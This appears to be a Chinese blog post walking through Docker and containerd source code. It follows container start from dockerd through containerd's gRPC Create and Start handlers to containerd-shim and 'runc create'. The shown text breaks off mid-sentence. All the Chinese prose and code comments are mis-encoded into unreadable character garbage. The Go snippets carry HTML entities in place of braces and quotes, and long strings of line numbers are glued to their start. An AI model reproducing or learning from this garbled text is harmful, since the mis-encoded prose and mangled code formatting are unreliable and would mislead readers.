è¿™é‡Œéœ€è¦è·Ÿè¿›ä¸€ä¸‹ container.StreamConfig.Stdin() != nil || container.Config.Tty, container.InitializeStdio) // å¿½ç•¥é”™è¯¯å¤„ç†... containerStart å‡½æ•°å‡†å¤‡ containerd è¿è¡Œçš„ä¸€åˆ‡éœ€è¦çš„ä¸œè¥¿åŒ…æ‹¬å­˜å‚¨å’Œç½‘ç»œã€‚ä½†æ˜¯å®é™…å¯åŠ¨å¯ä»¥å‘ç°æ˜¯è°ƒç”¨äº†daemon.containerd.Createä¸daemon.containerd.Startæ¥å£ï¼Œç»†èŠ‚ä¸‹é¢è¿›ä¸€æ­¥åˆ†æã€‚ 1234567891011121314151617181920212223242526272829func (c *client) Create(ctx context.Context, id string, ociSpec *specs.Spec, runtimeOptions interface&#123;&#125;) error &#123;\tif ctr := c.getContainer(id); ctr != nil &#123; return errors.WithStack(newConflictError(&quot;id already in use&quot;))\t&#125;\tbdir, err := prepareBundleDir(filepath.Join(c.stateDir, id), ociSpec) // å…¶å®å°±æ˜¯å‡†å¤‡å®¹å™¨å¯åŠ¨ç›®å½•ä¹‹ç±»çš„\tif err != nil &#123; return errdefs.System(errors.Wrap(err, &quot;prepare bundle dir failed&quot;))\t&#125;\tc.logger.WithField(&quot;bundle&quot;, bdir).WithField(&quot;root&quot;, ociSpec.Root.Path).Debug(&quot;bundle dir created&quot;)\tcdCtr, err := c.client.NewContainer(ctx, id, // æ ¸å¿ƒä»£ç ï¼Œæ›´å¤šçš„é€»è¾‘éœ€è¦ä¸‹é¢å±•å¼€ containerd.WithSpec(ociSpec), // TODO(mlaventure): when containerd support lcow, revisit runtime value containerd.WithRuntime(fmt.Sprintf(&quot;io.containerd.runtime.v1.%s&quot;, runtime.GOOS), runtimeOptions))\tif err != nil &#123; return wrapError(err)\t&#125;\tc.Lock()\tc.containers[id] = &amp;container&#123; bundleDir: bdir, ctr: cdCtr,\t&#125;\tc.Unlock()\treturn nil&#125; NewContainer() å°±æ˜¯è¿™ä¸€æ®µä»£ç çš„æ ¸å¿ƒï¼Œéœ€è¦å±•å¼€è¯´æ˜ 1234567891011121314151617181920212223242526// NewContainer will create a new container in container with the provided id// the id must be unique within the namespacefunc (c *Client) NewContainer(ctx context.Context, id string, opts ...NewContainerOpts) (Container, error) &#123; ctx, done, err := c.WithLease(ctx) if err != nil &#123; return nil, err &#125; defer done(ctx) container := containers.Container&#123; ID: id, Runtime: containers.RuntimeInfo&#123; Name: c.runtime, &#125;, &#125; for _, o := range opts &#123; if err := o(ctx, c, &amp;container); err != nil &#123; return nil, err &#125; &#125; r, err := c.ContainerService().Create(ctx, container) // æ ¸å¿ƒå°±æ˜¯ create äº† if err != nil &#123; return nil, err &#125; return containerFromRecord(c, r), nil&#125; å¯ä»¥çœ‹åˆ°c.ContainerService().Create(ctx, container)å…¶å®è°ƒç”¨äº† container serviceï¼Œè¿™ä¸ªä¸ªæ˜¯ docker å±‚é¢çš„æŠ½è±¡ï¼Œå…·ä½“å®ç°æ˜¯ containerdæä¾›çš„ã€‚ 1234func (r *remoteContainers) Create(ctx context.Context, container containers.Container) (containers.Container, error) &#123; created, err := r.client.Create(ctx, &amp;containersapi.CreateContainerRequest&#123; Container: containerToProto(&amp;container),... 1234func (c *containersClient) Create(ctx context.Context, in *CreateContainerRequest, opts ...grpc.CallOption) (*CreateContainerResponse, error) &#123;\tout := new(CreateContainerResponse)\terr := grpc.Invoke(ctx, &quot;/containerd.services.containers.v1.Containers/Create&quot;, in, out, c.cc, opts...)... åŸºäºä¸Šè¿°client.createå…¶å®ä¹Ÿå¯ä»¥å‘ç°ï¼Œå®è´¨æ€§çš„å·¥ä½œåªæœ‰ä¸€ä¸ªå°±æ˜¯å‡†å¤‡å¯åŠ¨éœ€è¦ä¸€äº›ç›®å½•ç»“æ„ã€‚è¿™ä¸€åˆ‡éƒ½æ˜¯ä¸ºäº†å‡†å¤‡è°ƒç”¨ /containerd.services.containers.v1.Containers/Createæ¥å£ã€‚ docker è°ƒç”¨å®Œæˆ containerd çš„ create ä¸‹é¢å°±è¦è°ƒç”¨ daemon.containerd.Start()ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// Start create and start a task for the specified containerd idfunc (c *client) Start(ctx context.Context, id, checkpointDir string, withStdin bool, attachStdio StdioCallback) (int, error) &#123;\tctr := c.getContainer(id)\tif ctr == nil &#123; return -1, errors.WithStack(newNotFoundError(&quot;no such container&quot;))\t&#125;\tif t := ctr.getTask(); t != nil &#123; return -1, errors.WithStack(newConflictError(&quot;container already started&quot;))\t&#125;\tvar ( cp *types.Descriptor t containerd.Task rio cio.IO err error stdinCloseSync = make(chan struct&#123;&#125;)\t)\t// å¿½ç•¥ checkpoint ç›¸å…³ä»£ç \tspec, err := ctr.ctr.Spec(ctx)\tif err != nil &#123; return -1, errors.Wrap(err, &quot;failed to retrieve spec&quot;)\t&#125;\tuid, gid := getSpecUser(spec)\tt, err = ctr.ctr.NewTask(ctx, // è¿™é‡Œå°±æ˜¯è°ƒç”¨ containerd, /containerd.services.tasks.v1.Tasks/Create func(id string) (cio.IO, error) &#123; fifos := newFIFOSet(ctr.bundleDir, InitProcessName, withStdin, spec.Process.Terminal) rio, err = c.createIO(fifos, id, InitProcessName, stdinCloseSync, attachStdio) return rio, err &#125;, func(_ context.Context, _ *containerd.Client, info *containerd.TaskInfo) error &#123; info.Checkpoint = cp info.Options = &amp;runctypes.CreateOptions&#123; IoUid: uint32(uid), IoGid: uint32(gid), NoPivotRoot: os.Getenv(&quot;DOCKER_RAMDISK&quot;) != &quot;&quot;, &#125; return nil &#125;)// ç§»é™¤é”™è¯¯å¤„ç†ç›¸å…³ä»£ç \tctr.setTask(t)\t// Signal c.createIO that it can call CloseIO\tclose(stdinCloseSync)\tif err := t.Start(ctx); err != nil &#123; // è¿™ä¸ª t æ˜¯ task çš„ç¼©å†™ï¼Œ/containerd.services.tasks.v1.Tasks/Start// ç§»é™¤é”™è¯¯å¤„ç†ç›¸å…³ä»£ç  åŸºäºä¸Šè¿°ä»£ç å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œè¿˜æ˜¯äºŒæ¬¡å°è£…äº†ã€‚ ctr.ctr.NewTask() å°±æ˜¯å‡†å¤‡å¥½å‚æ•°å‡†å¤‡è°ƒç”¨ containerdçš„/containerd.services.tasks.v1.Tasks/Createæ¥å£ã€‚ 123456789101112131415161718func (c *container) NewTask(ctx context.Context, ioCreate cio.Creator, opts ...NewTaskOpts) (_ Task, err error) &#123; // åˆ é™¤ææ„å‡½æ•°å’Œé”™è¯¯å¤„ç†\tcfg := i.Config()\trequest := &amp;tasks.CreateTaskRequest&#123; ContainerID: c.id, Terminal: cfg.Terminal, Stdin: cfg.Stdin, Stdout: cfg.Stdout, Stderr: cfg.Stderr,\t&#125;\t// åˆ é™¤éƒ¨åˆ†ä»£ç \tresponse, err := c.client.TaskService().Create(ctx, request) // task service create\tif err != nil &#123; return nil, errdefs.FromGRPC(err)\t&#125;\tt.pid = response.Pid\treturn t, nil&#125; 12345678func (c *tasksClient) Create(ctx context.Context, in *CreateTaskRequest, opts ...grpc.CallOption) (*CreateTaskResponse, error) &#123; out := new(CreateTaskResponse) err := grpc.Invoke(ctx, &quot;/containerd.services.tasks.v1.Tasks/Create&quot;, in, out, c.cc, opts...) if err != nil &#123; return nil, err &#125; return out, nil&#125; è€Œt.Start(ctx)å‡½æ•°çš„å®ç°æ›´ç®€å•ï¼Œæœ€åè°ƒç”¨containerdçš„/containerd.services.tasks.v1.Tasks/Startæ¥å£ 12345678func (c *tasksClient) Start(ctx context.Context, in *StartRequest, opts ...grpc.CallOption) (*StartResponse, error) &#123;\tout := new(StartResponse)\terr := grpc.Invoke(ctx, &quot;/containerd.services.tasks.v1.Tasks/Start&quot;, in, out, c.cc, opts...)\tif err != nil &#123; return nil, err\t&#125;\treturn out, nil&#125; åŸºäºä»¥ä¸Šåˆ†æï¼Œå…¶å® dockerd çš„ContainerStartå…ˆåä¼šè°ƒç”¨åˆ°cotnainerdçš„/containerd.services.containers.v1.Containers/Createï¼Œå…¶æ¬¡/containerd.services.tasks.v1.Tasks/Createï¼Œæœ€åæ˜¯/containerd.services.tasks.v1.Tasks/Startã€‚ é‚£ä¹ˆä¸‹é¢å°±å»èµ°è¯»ä¸€ä¸‹ containerdçš„ç›¸å…³å®ç°ã€‚ containerdæ ¹æ®çº¿ä¸Šä¿¡æ¯ checkout å‡ºcontainerdç‰ˆæœ¬ä¸º7ad184331fa3e55e52b890ea95e65ba581ae3429çš„ä»£ç è¿›è¡Œèµ°è¯»ã€‚æ ¹æ®ä¸Šä¸€ç¯‡ç»“æŸçš„æ¥å£ä¿¡æ¯ï¼Œç›´æ¥æœç´¢ç›¸å…³GRPCæ¥å£å¯ä»¥æ‰¾åˆ°å®ç°çš„ handlerã€‚ 123456789func _Containers_Create_Handler(srv interface&#123;&#125;, ctx context.Context, dec func(interface&#123;&#125;) error, interceptor ...\tinfo := &amp;grpc.UnaryServerInfo&#123; Server: srv, FullMethod: &quot;/containerd.services.containers.v1.Containers/Create&quot;,\t&#125;\thandler := func(ctx context.Context, req interface&#123;&#125;) (interface&#123;&#125;, error) &#123; return srv.(ContainersServer).Create(ctx, req.(*CreateContainerRequest))... 123456789func _Tasks_Create_Handler(srv interface&#123;&#125;, ctx context.Context, dec func(interface&#123;&#125;) error, interceptor grpc.UnaryServerInterceptor) (interface&#123;&#125;, error) &#123;...\tinfo := &amp;grpc.UnaryServerInfo&#123; Server: srv, FullMethod: &quot;/containerd.services.tasks.v1.Tasks/Create&quot;,\t&#125;\thandler := func(ctx context.Context, req interface&#123;&#125;) (interface&#123;&#125;, error) &#123; return srv.(TasksServer).Create(ctx, req.(*CreateTaskRequest))... 123456789func _Tasks_Start_Handler(srv interface&#123;&#125;, ctx context.Context, dec func(interface&#123;&#125;) error, interceptor grpc.UnaryServerInterceptor) (interface&#123;&#125;, error) &#123;...\tinfo := &amp;grpc.UnaryServerInfo&#123; Server: srv, FullMethod: &quot;/containerd.services.tasks.v1.Tasks/Start&quot;,\t&#125;\thandler := func(ctx context.Context, req interface&#123;&#125;) (interface&#123;&#125;, error) &#123; return srv.(TasksServer).Start(ctx, req.(*StartRequest))... é‚£ä¹ˆè¿™ä¸€ç¯‡åˆ†åˆ«èµ°è¯»ä¸€ä¸‹ä¸‰ä¸ªæ¥å£æ˜¯å¦‚ä½•å®ç°çš„ã€‚ ContainersServer.Create æ–¹æ³•çš„å®ç°å†æ¥çœ‹ä¸€ä¸‹createå®ç°ï¼Œé€šè¿‡ä¹‹å‰ api é…åˆ IDE å°±èƒ½ç›´æ¥è½¬è·³åˆ°ä¸‹é¢çš„ä»£ç å®ç°ã€‚ 12345678func (l *local) Create(ctx context.Context, req *api.CreateContainerRequest, _ ...grpc.CallOption) (*api.CreateContainerResponse, error) &#123;\tvar resp api.CreateContainerResponse\tif err := l.withStoreUpdate(ctx, func(ctx context.Context, store containers.Store) error &#123; container := containerFromProto(&amp;req.Container) created, err := store.Create(ctx, container) // å°† container çš„ä¿¡æ¯å†™å…¥æœ¬åœ°çš„ä¸€ä¸ªæ•°æ®åº“... é€šè¿‡å¯¹ä¸Šé¢ä»£ç èµ°è¯»åˆ†æï¼Œå‘ç°å…¶å® cotnainerd çš„ create æ“ä½œä»…ä»…å°±æ˜¯å†™ä¸€ä¸ªæ•°æ®åˆ° bucket ä¸­å»ï¼Œè¿˜æœ‰ä¸€ä¸ª eventä¿¡æ¯ create containerã€‚ç›®å‰è¿˜ä¸æ˜ç™½è¿™ä¸ª event é™¤äº†ä½¿ç”¨ ctr eventsçœ‹åˆ°è¿˜æœ‰å…¶ä»–çš„ä½œç”¨ä¹ˆï¼Ÿ TasksServer.Create æ–¹æ³•çš„å®ç°containerd ä½¿ç”¨ task æ¥ç®¡ç† container çš„åˆ›å»ºå’Œåˆ é™¤ï¼Œåœ¨ containerd çš„ readme æ–‡æ¡£ä¸­ä¹Ÿå†™çš„æ¯”è¾ƒæ¸…æ¥šäº†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051func (l *local) Create(ctx context.Context, r *api.CreateTaskRequest, _ ...grpc.CallOption) (*api.CreateTaskResponse, error) &#123;\tvar ( checkpointPath string err error\t)\tcontainer, err := l.getContainer(ctx, r.ContainerID) // å‰é¢å†™ dbï¼Œè¿™é‡Œè¯» db è·å– cotnainer çš„ä¿¡æ¯ã€‚\tif err != nil &#123; return nil, errdefs.ToGRPC(err)\t&#125;\topts := runtime.CreateOpts&#123; Spec: container.Spec, IO: runtime.IO&#123; Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, &#125;, Checkpoint: checkpointPath, Runtime: container.Runtime.Name, RuntimeOptions: container.Runtime.Options, TaskOptions: r.Options,\t&#125;\tfor _, m := range r.Rootfs &#123; opts.Rootfs = append(opts.Rootfs, mount.Mount&#123; Type: m.Type, Source: m.Source, Options: m.Options, &#125;)\t&#125;\truntime, err := l.getRuntime(container.Runtime.Name) // runtime åå­—ï¼Œç°åœ¨æœ‰ v1.linux, v2 ä¸¤ä¸ªå®ç°\tif err != nil &#123; return nil, err\t&#125;\tc, err := runtime.Create(ctx, r.ContainerID, opts) // ç›®å‰çº¿ä¸Šä½¿ç”¨ v1ï¼ˆç›®å‰æ˜¯é€šè¿‡ containerd-shim åé¢çš„å‚æ•°åˆ¤æ–­å‡ºæ¥çš„ï¼Œv1/v2 å‚æ•°å·®åˆ«å¾ˆæ˜æ˜¾\tif err != nil &#123; return nil, errdefs.ToGRPC(err)\t&#125;\t// TODO: fast path for getting pid on create\tif err := l.monitor.Monitor(c); err != nil &#123; return nil, errors.Wrap(err, &quot;monitor task&quot;)\t&#125;\tstate, err := c.State(ctx)\tif err != nil &#123; log.G(ctx).Error(err)\t&#125;\treturn &amp;api.CreateTaskResponse&#123; ContainerID: r.ContainerID, Pid: state.Pid,\t&#125;, nil&#125; è¿™é‡Œä½¿ç”¨ v1 Linux runtime çš„create æ–¹æ³• 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115// Create a new taskfunc (r *Runtime) Create(ctx context.Context, id string, opts runtime.CreateOpts) (_ runtime.Task, err error) &#123;\tnamespace, err := namespaces.NamespaceRequired(ctx) // è¿™é‡Œ ns æ˜¯ mobyï¼Œå°±æ˜¯ docker é‚£ä¸ªæ–°çš„åå­—\tif err != nil &#123; return nil, err\t&#125;\tif err := identifiers.Validate(id); err != nil &#123; return nil, errors.Wrapf(err, &quot;invalid task id&quot;)\t&#125;\tropts, err := r.getRuncOptions(ctx, id)\tif err != nil &#123; return nil, err\t&#125;\tbundle, err := newBundle(id, // newBundle creates a new bundle on disk at the provided path for the given id filepath.Join(r.state, namespace), filepath.Join(r.root, namespace), opts.Spec.Value)\tif err != nil &#123; return nil, err\t&#125;\tdefer func() &#123; if err != nil &#123; bundle.Delete() &#125;\t&#125;() // ShimLocal is a ShimOpt for using an in process shim implementation\tshimopt := ShimLocal(r.config, r.events)\tif !r.config.NoShim &#123; // åœ¨æ­£å¸¸çš„é€»è¾‘ä¼šå‘½ä¸­è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨äº† shim var cgroup string if opts.TaskOptions != nil &#123; v, err := typeurl.UnmarshalAny(opts.TaskOptions) if err != nil &#123; return nil, err &#125; cgroup = v.(*runctypes.CreateOptions).ShimCgroup &#125; exitHandler := func() &#123; log.G(ctx).WithField(&quot;id&quot;, id).Info(&quot;shim reaped&quot;) t, err := r.tasks.Get(ctx, id) if err != nil &#123; // Task was never started or was already successfully deleted return &#125; lc := t.(*Task) log.G(ctx).WithFields(logrus.Fields&#123; &quot;id&quot;: id, &quot;namespace&quot;: namespace, &#125;).Warn(&quot;cleaning up after killed shim&quot;) if err = r.cleanupAfterDeadShim(context.Background(), bundle, namespace, id, lc.pid); err != nil &#123; log.G(ctx).WithError(err).WithFields(logrus.Fields&#123; &quot;id&quot;: id, &quot;namespace&quot;: namespace, &#125;).Warn(&quot;failed to clean up after killed shim&quot;) &#125; &#125; shimopt = ShimRemote(r.config, r.address, cgroup, exitHandler) // è¿™é‡Œç›®å‰åªæ˜¯æ„å»ºå¥½äº† shimopt è¿™ä¸ªå‡½æ•°ï¼Œç›®å‰è¿˜æ²¡æœ‰çœŸçš„è°ƒç”¨\t&#125;\t// shimopt è¿™ä¸ªå‡½æ•°å‡†å¤‡å¥½äº†ï¼Œè¿™é‡Œæ‰å¼€å§‹è°ƒç”¨å¯åŠ¨ shim å¹¶è¿”å› shim client\ts, err := bundle.NewShimClient(ctx, namespace, shimopt, ropts) if err != nil &#123; return nil, err\t&#125;\tdefer func() &#123; if err != nil &#123; if kerr := s.KillShim(ctx); kerr != nil &#123; log.G(ctx).WithError(err).Error(&quot;failed to kill shim&quot;) &#125; &#125;\t&#125;()\trt := r.config.Runtime\tif ropts != nil &amp;&amp; ropts.Runtime != &quot;&quot; &#123; rt = ropts.Runtime\t&#125;\tsopts := &amp;shim.CreateTaskRequest&#123; ID: id, Bundle: bundle.path, Runtime: rt, Stdin: opts.IO.Stdin, Stdout: opts.IO.Stdout, Stderr: opts.IO.Stderr, Terminal: opts.IO.Terminal, Checkpoint: opts.Checkpoint, Options: opts.TaskOptions,\t&#125;\tfor _, m := range opts.Rootfs &#123; sopts.Rootfs = append(sopts.Rootfs, &amp;types.Mount&#123; Type: m.Type, Source: m.Source, Options: m.Options, &#125;)\t&#125;\t// Create a new initial process and container with the underlying OCI runtime // cr, err := s.Create(ctx, sopts) // ä¹Ÿå°±æ˜¯ shim çš„ create æ–¹æ³•ï¼ŒæŒ‰ä½ä¸è¡¨åˆ°è®² containerd-shim å†è¯´ã€‚\tif err != nil &#123; return nil, errdefs.FromGRPC(err)\t&#125;\tt, err := newTask(id, namespace, int(cr.Pid), s, r.events, r.tasks, bundle)\tif err != nil &#123; return nil, err\t&#125;\tif err := r.tasks.Add(ctx, t); err != nil &#123; return nil, err\t&#125;\t// ... ç§»é™¤ä¸€éƒ¨åˆ† event ç›¸å…³é€»è¾‘\treturn t, nil&#125; åŸºäºä»¥ä¸Šå…¶å®å°±å·²ç»å‡†å¤‡å¥½äº† task å¹¶å¯åŠ¨ï¼Œåœ¨ cotnainerd ä¸­è°ƒç”¨ä½¿ç”¨å‘½ä»¤è¡Œè°ƒç”¨ containerd-shimã€‚å…¶ä½™çš„é€»è¾‘è¦åˆ° cotnainerd-shim ä¸­å»æ¢ç´¢äº†ã€‚ TasksServer.Start æ–¹æ³•çš„å®ç°create æ“ä½œçœ‹å®Œäº†çœ‹ä¸€ä¸‹ start æ–¹æ³•æ˜¯å¦‚ä½•å®ç°çš„ï¼Œæœç´¢å…¶å¯¹åº”çš„æ¥å£ /containerd.services.tasks.v1.Tasks/Start 12func (s *service) Start(ctx context.Context, r *api.StartRequest) (*api.StartResponse, error) &#123;\treturn s.local.Start(ctx, r) ä¾ç„¶æ˜¯ v1.linux å®ç° 12345678910111213141516171819202122func (l *local) Start(ctx context.Context, r *api.StartRequest, _ ...grpc.CallOption) (*api.StartResponse, error) &#123;\tt, err := l.getTask(ctx, r.ContainerID) // è¿™é‡Œå°±æ˜¯ä» bucket db ä¸­è·å–æ•°æ®\tif err != nil &#123; return nil, err\t&#125;\tp := runtime.Process(t)\tif r.ExecID != &quot;&quot; &#123; if p, err = t.Process(ctx, r.ExecID); err != nil &#123; return nil, errdefs.ToGRPC(err) &#125;\t&#125;\tif err := p.Start(ctx); err != nil &#123; // Start the container&#x27;s user defined process return nil, errdefs.ToGRPC(err)\t&#125;\tstate, err := p.State(ctx)\tif err != nil &#123; return nil, errdefs.ToGRPC(err) // ToGRPC\t&#125;\treturn &amp;api.StartResponse&#123; Pid: state.Pid,\t&#125;, nil... 12345678// Start the taskfunc (t *Task) Start(ctx context.Context) error &#123;\tt.mu.Lock()\thasCgroup := t.cg != nil\tt.mu.Unlock()\tr, err := t.shim.Start(ctx, &amp;shim.StartRequest&#123; // è°ƒç”¨ shim çš„ start ID: t.id,... åŸºäºä»¥ä¸Šä¸¤ä¸ªæ¥å£å…¶å®å‘ç°æ›´å¤šå·¥ä½œ containerd æ”¾åˆ°äº† conteinrd-shim ä¸­å®Œæˆäº†ã€‚ containerd-shim çš„å¦‚ä½•å·¥ä½œåˆçœ‹ containerd-shim çš„å®ç°æ¨¡å‹ä¹Ÿä¸æ˜¯å¾ˆå¤æ‚ï¼Œä¸»å‡½æ•°ä¸­è°ƒç”¨ä¸€ä¸ª rpc æœåŠ¡å¸¸é©»åå°ï¼Œå¯¹å¤–æä¾›æœåŠ¡ã€‚ 1234func main() &#123;...\tif err := executeShim(); err != nil &#123; 1234567891011121314151617181920212223242526272829func executeShim() error &#123;....\t&#125;\tserver, err := newServer()\tif err != nil &#123; return errors.Wrap(err, &quot;failed creating server&quot;)\t&#125;\tsv, err := shim.NewService( shim.Config&#123; Path: path, Namespace: namespaceFlag, WorkDir: workdirFlag, Criu: criuFlag, SystemdCgroup: systemdCgroupFlag, RuntimeRoot: runtimeRootFlag, &#125;, &amp;remoteEventsPublisher&#123;address: addressFlag&#125;,\t)\tif err != nil &#123; return err\t&#125;\tlogrus.Debug(&quot;registering ttrpc server&quot;)\tshimapi.RegisterShimService(server, sv) // ttrpc socket := socketFlag\tif err := serve(context.Background(), server, socket); err != nil &#123; return err\t&#125;.... å”¯ä¸€å€¼å¾—ä¸€æçš„å°±æ˜¯ttrpcæ˜¯ä½å†…å­˜ä¸‹é¢çš„ rpc åè®®ï¼ŒåŸºäº grpc çš„ä½å†…å­˜ç‰ˆæœ¬ã€‚ 1234567891011121314151617func RegisterShimService(srv *ttrpc.Server, svc ShimService) &#123;\tsrv.Register(&quot;containerd.runtime.linux.shim.v1.Shim&quot;, map[string]ttrpc.Method&#123;... &quot;Create&quot;: func(ctx context.Context, unmarshal func(interface&#123;&#125;) error) (interface&#123;&#125;, error) &#123; var req CreateTaskRequest if err := unmarshal(&amp;req); err != nil &#123; return nil, err &#125; return svc.Create(ctx, &amp;req) &#125;, &quot;Start&quot;: func(ctx context.Context, unmarshal func(interface&#123;&#125;) error) (interface&#123;&#125;, error) &#123; var req StartRequest if err := unmarshal(&amp;req); err != nil &#123; return nil, err &#125; return svc.Start(ctx, &amp;req) &#125;, è¿™æ¬¡åªå…³å¿ƒ shim çš„ Create ä¸ Start å®ç°ã€‚ contained-shim createè¿™ä¸ªå°±æ˜¯containerdçš„s.Create(ctx, sopts)å®ç°çš„åœ°æ–¹ 123func (c *local) Create(ctx context.Context, in *shimapi.CreateTaskRequest) (*shimapi.CreateTaskResponse, error) &#123;\treturn c.s.Create(ctx, in)... create 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879// Create a new initial process and container with the underlying OCI runtimefunc (s *Service) Create(ctx context.Context, r *shimapi.CreateTaskRequest) (_ *shimapi.CreateTaskResponse, err error) &#123;\tvar mounts []proc.Mount\tfor _, m := range r.Rootfs &#123; mounts = append(mounts, proc.Mount&#123; Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, &#125;)\t&#125;\tconfig := &amp;proc.CreateConfig&#123; ID: r.ID, Bundle: r.Bundle, Runtime: r.Runtime, Rootfs: mounts, Terminal: r.Terminal, Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Checkpoint: r.Checkpoint, ParentCheckpoint: r.ParentCheckpoint, Options: r.Options,\t&#125;\trootfs := filepath.Join(r.Bundle, &quot;rootfs&quot;)\tdefer func(rootfs string) &#123; if err != nil &#123; if err2 := mount.UnmountAll(rootfs, 0); err2 != nil &#123; log.G(ctx).WithError(err2).Warn(&quot;Failed to cleanup rootfs mount&quot;) &#125; &#125;\t&#125;(rootfs)\tfor _, rm := range mounts &#123; m := &amp;mount.Mount&#123; Type: rm.Type, Source: rm.Source, Options: rm.Options, &#125; if err := m.Mount(rootfs); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to mount rootfs component %v&quot;, m) &#125;\t&#125;\ts.mu.Lock()\tdefer s.mu.Unlock()\tif len(mounts) == 0 &#123; rootfs = &quot;&quot;\t&#125;\tprocess, err := newInit( ctx, s.config.Path, s.config.WorkDir, s.config.RuntimeRoot, s.config.Namespace, s.config.Criu, s.config.SystemdCgroup, s.platform, config, rootfs,\t)\tif err != nil &#123; return nil, errdefs.ToGRPC(err)\t&#125;\tif err := process.Create(ctx, config); err != nil &#123; return nil, errdefs.ToGRPC(err)\t&#125;\t// save the main task id and bundle to the shim for additional requests\ts.id = r.ID\ts.bundle = r.Bundle\tpid := process.Pid()\ts.processes[r.ID] = process\treturn &amp;shimapi.CreateTaskResponse&#123; Pid: uint32(pid),\t&#125;, nil&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788// Create the process with the provided configfunc (p *Init) Create(ctx context.Context, r *CreateConfig) error &#123;\tvar ( err error socket *runc.Socket\t)\tif r.Terminal &#123; if socket, err = runc.NewTempConsoleSocket(); err != nil &#123; return errors.Wrap(err, &quot;failed to create OCI runtime console socket&quot;) &#125; defer socket.Close()\t&#125; else if hasNoIO(r) &#123; if p.io, err = runc.NewNullIO(); err != nil &#123; return errors.Wrap(err, &quot;creating new NULL IO&quot;) &#125;\t&#125; else &#123; if p.io, err = runc.NewPipeIO(p.IoUID, p.IoGID, withConditionalIO(p.stdio)); err != nil &#123; return errors.Wrap(err, &quot;failed to create OCI runtime io pipes&quot;) &#125;\t&#125;\tpidFile := filepath.Join(p.Bundle, InitPidFile)\tif r.Checkpoint != &quot;&quot; &#123; opts := &amp;runc.RestoreOpts&#123; CheckpointOpts: runc.CheckpointOpts&#123; ImagePath: r.Checkpoint, WorkDir: p.WorkDir, ParentPath: r.ParentCheckpoint, &#125;, PidFile: pidFile, IO: p.io, NoPivot: p.NoPivotRoot, Detach: true, NoSubreaper: true, &#125; p.initState = &amp;createdCheckpointState&#123; p: p, opts: opts, &#125; return nil\t&#125;\topts := &amp;runc.CreateOpts&#123; PidFile: pidFile, IO: p.io, NoPivot: p.NoPivotRoot, NoNewKeyring: p.NoNewKeyring,\t&#125;\tif socket != nil &#123; opts.ConsoleSocket = socket\t&#125;\tif err := p.runtime.Create(ctx, r.ID, r.Bundle, opts); err != nil &#123; return p.runtimeError(err, &quot;OCI runtime create failed&quot;)\t&#125;\tif r.Stdin != &quot;&quot; &#123; sc, err := fifo.OpenFifo(context.Background(), r.Stdin, syscall.O_WRONLY|syscall.O_NONBLOCK, 0) if err != nil &#123; return errors.Wrapf(err, &quot;failed to open stdin fifo %s&quot;, r.Stdin) &#125; p.stdin = sc p.closers = append(p.closers, sc)\t&#125;\tvar copyWaitGroup sync.WaitGroup\tctx, cancel := context.WithTimeout(ctx, 30*time.Second)\tdefer cancel()\tif socket != nil &#123; console, err := socket.ReceiveMaster() if err != nil &#123; return errors.Wrap(err, &quot;failed to retrieve console master&quot;) &#125; console, err = p.Platform.CopyConsole(ctx, console, r.Stdin, r.Stdout, r.Stderr, &amp;p.wg, &amp;copyWaitGroup) if err != nil &#123; return errors.Wrap(err, &quot;failed to start console copy&quot;) &#125; p.console = console\t&#125; else if !hasNoIO(r) &#123; if err := copyPipes(ctx, p.io, r.Stdin, r.Stdout, r.Stderr, &amp;p.wg, &amp;copyWaitGroup); err != nil &#123; return errors.Wrap(err, &quot;failed to start io pipe copy&quot;) &#125;\t&#125;\tcopyWaitGroup.Wait()\tpid, err := runc.ReadPidFile(pidFile)\tif err != nil &#123; return errors.Wrap(err, &quot;failed to retrieve OCI runtime container pid&quot;)\t&#125;\tp.pid = pid\treturn nil&#125; 123456789101112131415161718192021222324// Create creates a new container and returns its pid if it was created successfullyfunc (r *Runc) Create(context context.Context, id, bundle string, opts *CreateOpts) error &#123;\targs := []string&#123;&quot;create&quot;, &quot;--bundle&quot;, bundle&#125; // è¿™é‡Œå°±æ˜¯ runc create --bundle çš„å‘½ä»¤è¡Œäº†\tif opts != nil &#123; oargs, err := opts.args() if err != nil &#123; return err &#125; args = append(args, oargs...)\t&#125;\tcmd := r.command(context, append(args, id)...)\tif opts != nil &amp;&amp; opts.IO != nil &#123; opts.Set(cmd)\t&#125;\tcmd.ExtraFiles = opts.ExtraFiles\tif cmd.Stdout == nil &amp;&amp; cmd.Stderr == nil &#123; data, err := cmdOutput(cmd, true) if err != nil &#123; return fmt.Errorf(&quot;%s: %s&quot;, err, data) &#125; return nil\t&#125;... contained-shim startåŸºäº containerd çš„åˆ†æå…¶å®è¿˜çœ‹åˆ°è°ƒç”¨ t.shim.Start(ctx, &amp;shim.StartRequest&#123;ID: t.id&#125;) 12func (c *local) Start(ctx context.Context, in *shimapi.StartRequest) (*shimapi.StartResponse, error) &#123; return c.s.Start(ctx, in) 12345678910111213// Start a processfunc (s *Service) Start(ctx context.Context, r *shimapi.StartRequest) (*shimapi.StartResponse, error) &#123; p, err := s.getExecProcess(r.ID) // get exec process if err != nil &#123; return nil, err &#125; if err := p.Start(ctx); err != nil &#123; return nil, err &#125; return &amp;shimapi.StartResponse&#123; ID: p.ID(), Pid: uint32(p.Pid()), &#125;, nil 12345func (e *execProcess) Start(ctx context.Context) error &#123; e.mu.Lock() defer e.mu.Unlock() return e.execState.Start(ctx) // execState è¿™ä¼šåº”è¯¥æ˜¯ createdï¼Œå› ä¸ºå‰é¢å·²ç» runc create --bundle äº† 12func (s *createdState) Start(ctx context.Context) error &#123;\tif err := s.p.start(ctx); err != nil &#123; 12func (p *Init) start(ctx context.Context) error &#123;\terr := p.runtime.Start(ctx, p.id) 1234// Start will start an 